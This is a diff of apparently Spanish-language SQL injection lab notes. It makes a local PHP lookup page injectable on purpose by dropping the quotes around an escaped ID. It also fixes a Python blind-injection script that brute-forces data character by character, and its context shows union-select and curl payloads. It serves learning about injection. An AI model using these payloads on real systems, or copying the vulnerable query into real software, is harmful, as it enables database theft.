@@ -2310,12 +2310,12 @@ id=-1' union select database()-- - # 'Porque tenemos solo una consulta en el arc
     # Sanitizacion
     $id = mysqli_real_escape_string($conn, $_GET['id']);
     
-    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
+    $data = mysqli_query($conn, "select username from users where id = $id");
 
     $response = mysqli_fetch_array($data);
 
-    if(!isset($response['username'])){
-        http_response_code(400);
+    if(! isset($response['username'])){
+        http_response_code(404);
     }
 ?>
 # ----- searchUsers.php fin
@@ -2334,7 +2334,7 @@ curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 o
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
-from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+from pwn import * # apt install python3-pwntools
 
 # Ctrl+C
 
@@ -2354,7 +2354,7 @@ def makeSQLI():
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
-    p2 = log.process("Datos extraídos")
+    p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
     for position in range(1,50):
@@ -2363,14 +2363,14 @@ def makeSQLI():
 
             p1.status(sqli_url)
 
-            r = request.get(sqli_url)
+            r = requests.get(sqli_url)
 
-            if r.status.code == 200:
+            if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
-if __name__ = "__main__":
+if __name__ == "__main__":
     makeSQLI()
 # ----- sqli.py fin
 
